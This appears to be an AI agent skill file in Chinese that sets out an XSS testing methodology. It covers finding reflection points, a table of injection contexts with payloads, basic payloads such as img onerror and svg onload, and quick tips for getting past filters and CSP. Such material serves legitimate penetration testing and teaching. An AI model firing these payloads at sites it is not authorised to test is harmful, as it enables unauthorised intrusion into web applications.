---
name: xss-methodology
description: "反射型/存储型/DOM XSS 的检测、利用和绕过。当 Web 应用有用户输入回显（搜索/评论/表单/URL参数）、或发现存储型内容输出点时使用。包含上下文分析决策树、WAF绕过技巧、CSP绕过方法、DOM Clobbering、mXSS、SVG XSS。优先于其他漏洞测试——XSS 是最低成本的高危漏洞，发现后立即构造 PoC"
metadata:
  tags: "xss,cross-site scripting,injection,bypass,dom,reflected,stored,csp"
  category: "exploit"
  mitre_attack: "T1189,T1059.007"
---

# XSS 跨站脚本完整execution-framework

## ⛔ 深入参考（遇到 WAF/CSP 时必读）

- WAF/过滤绕过 payload 大全、CSP 绕过进阶、DOM Clobbering、mXSS、SVG XSS、存储型/DOM XSS → [references/xss-bypass-and-types.md](references/xss-bypass-and-types.md)
- CSP 绕过与 DOM XSS 深入技术 → [references/csp-bypass-and-dom-xss.md](references/csp-bypass-and-dom-xss.md)

---

## Phase 0: 回显点发现（最先执行！）

1. 每个参数发送唯一标记（`xss123test`），在响应中搜索
2. 不仅检查 HTML body，也检查响应头（`Location:`, `Set-Cookie:`）
3. 常见：搜索结果页、错误页面、用户records页

## Phase 1: 上下文分析（决定 payload）

| 上下文 | 示例 | 基础 Payload |
|--------|------|-------------|
| HTML 标签间 | `<div>INJECT</div>` | `<script>alert(1)</script>` |
| 属性值（双引号） | `<input value="INJECT">` | `" onfocus=alert(1) autofocus="` |
| 属性值（单引号） | `<input value='INJECT'>` | `' onfocus=alert(1) autofocus='` |
| JavaScript 字符串 | `var x="INJECT"` | `";alert(1)//` |
| URL/href | `<a href="INJECT">` | `javascript:alert(1)` |
| JS 模板字面量 | `` var x=`INJECT` `` | `${alert(1)}` 或 `` `+alert(1)+` `` |

**关键**：不同上下文需要不同 payload！先确定上下文再选择。

## Phase 2: 基础 XSS 测试

```
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>      ← script 被过滤时
3. <svg onload=alert(1)>
4. " onfocus=alert(1) autofocus="    ← 属性注入
```

**验证**：检查响应 HTML 中 payload 是否被原样保留（未编码）。`<` 变成 `&lt;` → 已转义，换参数。

## Phase 3: 绕过与高级利用

遇到 WAF/过滤 → [references/xss-bypass-and-types.md](references/xss-bypass-and-types.md)

速查：
- `<script>` 被过滤 → `<img>`, `<svg>`, `<details>`, `<video>`
- `alert` 被过滤 → `confirm()`, `prompt()`, `print()`
- `()` 被过滤 → `` alert`1` ``
- CSP 限制 → 检查 `unsafe-inline` / nonce / JSONP 端点

## 注意事项
- **先测回显再测注入**：没有回显就没有 XSS
- **HTTP-only Cookie 无法通过 XSS 窃取**
- 记录每个参数的编码行为
